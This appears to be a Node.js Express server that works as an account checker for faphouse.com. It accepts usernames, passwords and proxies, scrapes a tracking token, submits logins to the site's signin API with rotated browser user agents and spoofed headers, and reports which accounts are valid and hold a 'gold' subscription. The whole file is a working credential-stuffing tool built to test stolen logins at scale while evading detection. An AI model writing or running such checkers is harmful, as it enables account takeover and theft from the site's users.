const express = require('express');
const axios = require('axios');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, '../public')));

function getRandomUA() {
  const uas = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
  ];
  return uas[Math.floor(Math.random() * uas.length)];
}

// ✅ আপডেটেড Proxy Parser (এখন host:port:user:pass সাপোর্ট করে)
function parseProxy(str) {
  try {
    // 1. চেক করা হচ্ছে ফরম্যাটটি "host:port:user:pass" কিনা
    const parts = str.split(':');
    if (parts.length === 4) {
      const [host, port, username, password] = parts;
      // পোর্ট নাম্বার ভ্যালিড কিনা চেক
      const portNum = parseInt(port);
      if (!isNaN(portNum) && host) {
        return {
          host: host,
          port: portNum,
          protocol: 'http',  // HTTP প্রক্সি হিসেবে ধরা হচ্ছে
          auth: { username, password }
        };
      }
    }

    // 2. যদি না হয়, তাহলে স্ট্যান্ডার্ড URL ফরম্যাট চেক (http://user:pass@host:port)
    const url = new URL(str);
    const protocol = url.protocol.replace(':', '');
    const host = url.hostname;
    const port = parseInt(url.port) || (protocol === 'https' ? 443 : 80);
    const auth = url.username ? { username: url.username, password: url.password } : undefined;
    
    if (protocol === 'http' || protocol === 'https') {
      return { host, port, protocol, auth };
    }
    return null;
  } catch (e) {
    console.warn('Proxy parse error:', str, e.message);
    return null;
  }
}

// ─── Main check endpoint ───
app.post('/api/check', async (req, res) => {
  const { username, password, proxy } = req.body;

  if (!username || !password) {
    return res.status(400).json({ success: false, error: 'Missing credentials' });
  }

  let proxyConfig = null;
  if (proxy) {
    const parsed = parseProxy(proxy);
    if (parsed) {
      proxyConfig = parsed;
      console.log(`✅ Using proxy: ${proxyConfig.host}:${proxyConfig.port}`);
    } else {
      console.warn(`⚠️ Invalid proxy format: ${proxy}, skipping...`);
    }
  }

  const axiosConfig = {
    timeout: 30000,
    headers: {
      'User-Agent': getRandomUA(),
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.9',
      'Connection': 'keep-alive'
    },
    ...(proxyConfig && { proxy: proxyConfig })
  };

  try {
    // Step 1: Get trackingParamsBag
    const homeResp = await axios.get('https://faphouse.com/', axiosConfig);
    const html = homeResp.data;
    const match = html.match(/trackingParamsBag\\":\\"([^"]+)\\"/);
    if (!match) {
      return res.status(500).json({ success: false, error: 'Could not extract trackingParamsBag' });
    }
    const trackingParamsBag = match[1];

    // Step 2: Login
    const loginPayload = {
      login: username,
      password: password,
      rememberMe: '1',
      recaptcha: '',
      trackingParamsBag: trackingParamsBag
    };

    const loginHeaders = {
      'Host': 'faphouse.com',
      'Connection': 'keep-alive',
      'Accept': 'application/json',
      'Accept-Language': 'en-US,en;q=0.5',
      'Content-Type': 'application/json',
      'Origin': 'https://faphouse.com',
      'Referer': 'https://faphouse.com/',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'X-CSRF-Token': 'null',
      'User-Agent': getRandomUA()
    };

    const loginResp = await axios.post(
      'https://faphouse.com/api/auth/signin',
      loginPayload,
      {
        ...axiosConfig,
        headers: loginHeaders
      }
    );

    const data = loginResp.data;

    if (data && data.message && data.message.includes('Invalid credential')) {
      return res.json({ success: false, gold: false, error: 'Invalid credential' });
    }

    const success = data && (data.success === true || data.status === 'success' || data.message === 'success');
    if (!success) {
      return res.json({ success: false, gold: false, error: 'Login failed' });
    }

    let hasGold = false;
    if (data && data.hasGoldSubscription !== undefined) {
      hasGold = data.hasGoldSubscription === true || data.hasGoldSubscription === 'true';
    } else {
      try {
        const profileResp = await axios.get('https://faphouse.com/api/user/profile', {
          ...axiosConfig,
          headers: {
            ...loginHeaders,
            'Authorization': `Bearer ${data.token || ''}`
          }
        });
        if (profileResp.data && profileResp.data.hasGoldSubscription !== undefined) {
          hasGold = profileResp.data.hasGoldSubscription === true;
        }
      } catch (_) {}
    }

    return res.json({ success: true, gold: hasGold });

  } catch (error) {
    console.error('Check error:', error.message);
    // error.response দেখলে বুঝবেন আসলে কী সমস্যা (৪০৩, ৪২৯, ইত্যাদি)
    if (error.response) {
      console.error('Status:', error.response.status);
      console.error('Data:', error.response.data);
    }
    return res.status(500).json({
      success: false,
      gold: false,
      error: error.message || 'Request failed'
    });
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

module.exports = app;
